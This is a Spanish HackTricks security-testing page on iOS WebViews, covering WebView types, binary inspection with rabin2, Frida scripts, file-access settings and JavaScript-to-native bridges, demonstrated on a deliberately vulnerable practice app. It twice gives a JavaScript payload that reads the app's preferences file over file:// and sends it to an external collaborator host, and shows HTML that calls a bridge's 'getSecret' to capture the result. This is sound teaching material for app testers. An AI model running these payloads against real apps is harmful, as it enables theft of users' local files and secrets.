# iOS WebViews

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Tipos de WebViews

Los WebViews son componentes de navegador integrados en aplicaciones para mostrar **contenido web** interactivo. Se pueden utilizar para incrustar contenido web directamente en la interfaz de usuario de una aplicaci贸n. Los WebViews de iOS **soportan** la ejecuci贸n de **JavaScript** **por defecto**, por lo que la inyecci贸n de scripts y los ataques de Cross-Site Scripting pueden afectarlos.

* [**UIWebView**](https://developer.apple.com/documentation/uikit/uiwebview)**:** UIWebView est谩 obsoleto a partir de iOS 12 y no debe utilizarse. **JavaScript no puede ser desactivado**.
* [**WKWebView**](https://developer.apple.com/documentation/webkit/wkwebview): Esta es la opci贸n adecuada para ampliar la funcionalidad de la aplicaci贸n, controlando el contenido mostrado.
* **JavaScript** est谩 habilitado por defecto, pero gracias a la propiedad **`javaScriptEnabled`** de `WKWebView`, **puede ser completamente desactivado**, previniendo todos los fallos de inyecci贸n de scripts.
* La propiedad **`JavaScriptCanOpenWindowsAutomatically`** puede ser utilizada para **prevenir** que JavaScript **abra nuevas ventanas**, como pop-ups.
* La propiedad **`hasOnlySecureContent`** puede ser utilizada para verificar que los recursos cargados por el WebView se obtienen a trav茅s de conexiones cifradas.
* `WKWebView` implementa renderizado fuera de proceso, por lo que los **bugs de corrupci贸n de memoria no afectar谩n** al proceso principal de la aplicaci贸n.
*   [**SFSafariViewController**](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller)**:** Debe utilizarse para proporcionar una **experiencia de visualizaci贸n web generalizada**. Estos WebViews pueden ser f谩cilmente identificados ya que tienen un dise帽o caracter铆stico que incluye los siguientes elementos:

* Un campo de direcci贸n de solo lectura con un indicador de seguridad.
* Un bot贸n de Acci贸n ("**Compartir**").
* Un **bot贸n de Hecho**, botones de navegaci贸n hacia atr谩s y adelante, y un bot贸n de "Safari" para abrir la p谩gina directamente en Safari.

<img src="https://gblobscdn.gitbook.com/assets%2F-LH00RC4WVf3-6Ou4e0l%2F-Lf1APQHyCHdAvoJSvc_%2F-Lf1AQxr7FPsOyPFSGcs%2Fsfsafariviewcontroller.png?alt=media" alt="" data-size="original">

* **JavaScript no puede ser desactivado** en `SFSafariViewController` y esta es una de las razones por las que se recomienda el uso de `WKWebView` cuando el objetivo es ampliar la interfaz de usuario de la aplicaci贸n.
* `SFSafariViewController` tambi茅n **comparte cookies** y otros datos de sitios web con **Safari**.
* La actividad e interacci贸n del usuario con un `SFSafariViewController` **no son visibles para la aplicaci贸n**, la cual no puede acceder a los datos de AutoFill, historial de navegaci贸n o datos de sitios web.
* Seg煤n las Directrices de Revisi贸n de la App Store, los `SFSafariViewController` **no pueden estar ocultos o ser oscurecidos por otras vistas o capas**.

## Descubriendo la Configuraci贸n de WebViews

### An谩lisis Est谩tico

**UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView
896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView
1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView
```
**WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView
625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView
904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView
1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView
```
Alternativamente, tambi茅n puedes buscar m茅todos conocidos de estas clases WebView. Por ejemplo, busca el m茅todo utilizado para inicializar un WKWebView ([`init(frame:configuration:)`](https://developer.apple.com/documentation/webkit/wkwebview/1414998-init)):
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
```
#### Pruebas de Configuraci贸n de JavaScript

Para `WKWebView`s, como mejor pr谩ctica, JavaScript deber铆a estar deshabilitado a menos que sea expl铆citamente necesario. Para verificar que JavaScript fue deshabilitado correctamente, busque en el proyecto usos de `WKPreferences` y aseg煤rese de que la propiedad [`javaScriptEnabled`](https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled) est茅 establecida en `false`:
```
let webPreferences = WKPreferences()
webPreferences.javaScriptEnabled = false
```
Si solo tienes el binario compilado, puedes buscar esto en 茅l:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled
392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled
```
#### Pruebas de OnlySecureContent

A diferencia de `UIWebView`s, al usar `WKWebView`s es posible detectar [contenido mixto](https://developers.google.com/web/fundamentals/security/prevent-mixed-content/fixing-mixed-content?hl=en) (contenido HTTP cargado desde una p谩gina HTTPS). Utilizando el m茅todo [`hasOnlySecureContent`](https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent) se puede verificar si todos los recursos de la p谩gina se han cargado a trav茅s de conexiones seguras cifradas.\
En el binario compilado:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
Tambi茅n puedes buscar en el c贸digo fuente o en las cadenas de texto la cadena "http://". Sin embargo, esto no significa necesariamente que haya un problema de contenido mixto. Aprende m谩s sobre contenido mixto en los [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed\_content).

### An谩lisis Din谩mico

Es posible inspeccionar el mont贸n de memoria a trav茅s de `ObjC.choose()` para encontrar instancias de los diferentes tipos de WebViews y tambi茅n buscar las propiedades `javaScriptEnabled` y `hasonlysecurecontent`:

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
```
C谩rgalo con:
```
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

hasOnlySecureContent:  false
```
## Manejo del Protocolo WebView

Varios esquemas predeterminados est谩n disponibles y son interpretados en un WebView en iOS, por ejemplo:

* http(s)://
* file://
* tel://

Los WebViews pueden cargar contenido remoto desde un punto final, pero tambi茅n pueden cargar contenido local desde el directorio de datos de la aplicaci贸n. Si se carga contenido local, el usuario no deber铆a poder influir en el nombre del archivo o la ruta utilizada para cargar el archivo, y los usuarios no deber铆an poder editar el archivo cargado.

### Carga de contenido en WebView

* **UIWebView**: Puede usar m茅todos obsoletos [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc) o [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc) para cargar contenido.
* **WKWebView**: Puede usar los m茅todos [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc) o [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc) para cargar archivos HTML locales y `loadRequest:` para contenido web. T铆picamente, los archivos locales se cargan en combinaci贸n con m茅todos que incluyen, entre otros: [`pathForResource:ofType:`](https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource), [`URLForResource:withExtension:`](https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc) o [`init(contentsOf:encoding:)`](https://developer.apple.com/documentation/swift/string/3126736-init). Adem谩s, tambi茅n deber铆as verificar si la aplicaci贸n est谩 utilizando el m茅todo [`loadFileURL:allowingReadAccessToURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc). Su primer par谩metro es `URL` y contiene la URL que se cargar谩 en el WebView, su segundo par谩metro `allowingReadAccessToURL` puede contener un solo archivo o un directorio. Si contiene un solo archivo, ese archivo estar谩 disponible para el WebView. Sin embargo, si contiene un directorio, todos los archivos en ese **directorio estar谩n disponibles para el WebView**. Por lo tanto, vale la pena inspeccionar esto y en caso de que sea un directorio, verificar que no se pueda encontrar datos sensibles dentro de 茅l.

Si tienes el c贸digo fuente puedes buscar esos m茅todos. Teniendo el **binario** **compilado** tambi茅n puedes buscar estos m茅todos:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
### Acceso a Archivos

* **UIWebView:**
* El esquema `file://` siempre est谩 habilitado.
* El acceso a archivos desde URLs `file://` siempre est谩 habilitado.
* El acceso universal desde URLs `file://` siempre est谩 habilitado.
* Si recuperas el origen efectivo de un `UIWebView` donde `baseURL` tambi茅n est谩 configurado en `nil`, ver谩s que **no est谩 establecido en "null"**, en su lugar obtendr谩s algo similar a lo siguiente: `applewebdata://5361016c-f4a0-4305-816b-65411fc1d780`. Este origen "applewebdata://" es similar al origen "file://" ya que **no implementa la Pol铆tica de Mismo Origen** y permite el acceso a archivos locales y cualquier recurso web.

{% tabs %}
{% tab title="exfiltrate_file" %}
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
{% endtab %}
{% endtabs %}

* **WKWebView**:
* **`allowFileAccessFromFileURLs`** (`WKPreferences`, `false` por defecto): permite que JavaScript ejecutado en el contexto de una URL con esquema `file://` acceda a contenido de otras URLs con esquema `file://`.
* **`allowUniversalAccessFromFileURLs`** (`WKWebViewConfiguration`, `false` por defecto): permite que JavaScript ejecutado en el contexto de una URL con esquema `file://` acceda a contenido de cualquier origen.

Puedes buscar estas funciones en el c贸digo fuente de la aplicaci贸n o en el binario compilado.\
Tambi茅n, puedes usar el siguiente script de frida para encontrar esta informaci贸n:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```

```bash
frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>
URL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/
Library/WKWebView/scenario1.html
javaScriptEnabled:  true
allowFileAccessFromFileURLs:  0
hasOnlySecureContent:  false
allowUniversalAccessFromFileURLs:  0
```
#### Exfiltraci贸n de archivos arbitrarios
```javascript
//For some reason this payload doesn't work!!
//Let me know if you know how to exfiltrate local files from a WKWebView
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## M茅todos Nativos Expuestos a trav茅s de WebViews

Desde iOS 7, Apple introdujo APIs que permiten **comunicaci贸n entre el entorno de ejecuci贸n de JavaScript en el WebView y los objetos nativos** Swift o Objective-C.

Hay dos formas fundamentales de c贸mo el c贸digo nativo y JavaScript pueden comunicarse:

* **JSContext**: Cuando un bloque de Objective-C o Swift se asigna a un identificador en un `JSContext`, JavaScriptCore autom谩ticamente envuelve el bloque en una funci贸n de JavaScript.
* **Protocolo JSExport**: Las propiedades, m茅todos de instancia y m茅todos de clase declarados en un protocolo heredado de `JSExport` se mapean a objetos de JavaScript que est谩n disponibles para todo el c贸digo JavaScript. Las modificaciones de objetos que est谩n en el entorno de JavaScript se reflejan en el entorno nativo.

Nota que **solo los miembros de clase definidos en el protocolo `JSExport`** son accesibles al c贸digo JavaScript.\
Presta atenci贸n al c贸digo que mapea objetos nativos al `JSContext` asociado con un WebView y analiza qu茅 funcionalidad expone, por ejemplo, no se deben poder acceder ni exponer datos sensibles a trav茅s de WebViews.\
En Objective-C, el `JSContext` asociado con un `UIWebView` se obtiene de la siguiente manera:
```objectivec
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
El c贸digo JavaScript en un **`WKWebView` a煤n puede enviar mensajes de vuelta a la aplicaci贸n nativa, pero a diferencia de `UIWebView`, no es posible hacer referencia directamente al `JSContext`** de un `WKWebView`. En su lugar, la comunicaci贸n se implementa utilizando un sistema de mensajer铆a y usando la funci贸n `postMessage`, que serializa autom谩ticamente objetos JavaScript en objetos nativos de Objective-C o Swift. Los manejadores de mensajes se configuran utilizando el m茅todo [`add(_ scriptMessageHandler:name:)`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller/1537172-add).

### Habilitando JavascriptBridge
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Enviando Mensaje

Agregar un manejador de mensajes de script con el nombre `"name"` (o `"javaScriptBridge"` en el ejemplo anterior) hace que la funci贸n JavaScript `window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage` se defina en todos los marcos en todas las vistas web que usan el controlador de contenido del usuario. Luego, [puede usarse desde el archivo HTML de esta manera](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33):
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}
//After testing the previos funtion I got the error TypeError: undefined is not an object (evaluating 'window.webkit.messageHandlers')
//But the following code worked to call the exposed javascriptbridge with the args "addNumbers", "1", "2"

document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Una vez que la funci贸n Nativa se ejecuta, normalmente **ejecutar谩 algo de JavaScript dentro de la p谩gina web** (ver `evaluateJavascript` abajo), podr铆as estar interesado en **sobrescribir la funci贸n** que se va a ejecutar para **robar el resultado**.\
Por ejemplo, en el script a continuaci贸n, la funci贸n **`javascriptBridgeCallBack`** se va a ejecutar con 2 par谩metros (la funci贸n llamada y el **resultado**). Si controlas el HTML que se va a cargar, puedes crear una **alerta con el resultado** como:
```markup
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
### Funci贸n Llamada

La funci贸n llamada reside en [`JavaScriptBridgeMessageHandler.swift`](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29):
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
```
### Pruebas

Para probar el env铆o de un postMessage dentro de una aplicaci贸n, puedes:

* Cambiar la respuesta del servidor (MitM)
* Realizar una instrumentaci贸n din谩mica e inyectar el payload de JavaScript utilizando frameworks como Frida y las correspondientes funciones de evaluaci贸n de JavaScript disponibles para los iOS WebViews ([`stringByEvaluatingJavaScriptFromString:`](https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc) para `UIWebView` y [`evaluateJavaScript:completionHandler:`](https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc) para `WKWebView`).

## Depuraci贸n de iOS WebViews

(Tutorial de [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

En los iOS webviews, los mensajes enviados a `console.log()` _no_ se imprimen en los registros de Xcode. A煤n as铆, es relativamente f谩cil depurar contenido web con las herramientas de desarrollador de Safari, aunque hay un par de limitaciones:

* La depuraci贸n de iOS webviews requiere Safari, por lo que tu computadora de desarrollo debe estar ejecutando macOS.
* Solo puedes depurar webviews en aplicaciones cargadas en tu dispositivo a trav茅s de Xcode. No puedes depurar webviews en aplicaciones instaladas a trav茅s de la App Store o Apple Configurator.

Con esas limitaciones en mente, aqu铆 est谩n los pasos para depurar remotamente un webview en iOS:

* Primero, habilita el Inspector Web de Safari en tu dispositivo iOS abriendo la aplicaci贸n _Configuraci贸n_ de iOS, navegando a **Configuraci贸n > Safari > Avanzado**, y activando la opci贸n _Inspector Web_.

![Configuraci贸n de Safari en iOS](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/ios-safari-settings.jpg)

* A continuaci贸n, tambi茅n debes habilitar las herramientas de desarrollador en Safari en tu computadora de desarrollo. Inicia Safari en tu m谩quina de desarrollo y navega a **Safari > Preferencias** en la barra de men煤. En el panel de preferencias que aparece, haz clic en la pesta帽a _Avanzado_ y luego activa la opci贸n _Mostrar men煤 Desarrollo_ en la parte inferior. Despu茅s de hacerlo, puedes cerrar el panel de preferencias.

![Configuraci贸n de Safari en Mac](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-settings.jpg)

* Conecta tu dispositivo iOS a tu computadora de desarrollo y lanza tu aplicaci贸n.
* En Safari en tu computadora de desarrollo, haz clic en _Desarrollo_ en la barra de men煤 y pasa el cursor sobre la opci贸n desplegable que es el nombre de tu dispositivo iOS para mostrar una lista de instancias de webview ejecut谩ndose en tu dispositivo iOS.

![Men煤 de desarrollo de Safari en Mac](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-develop-menu.jpg)

* Haz clic en la opci贸n desplegable para el webview que deseas depurar. Esto abrir谩 una nueva ventana del Inspector Web de Safari para inspeccionar el webview.

![Ventana del Inspector Web de Safari](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-inspector.jpg)

## Referencias

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
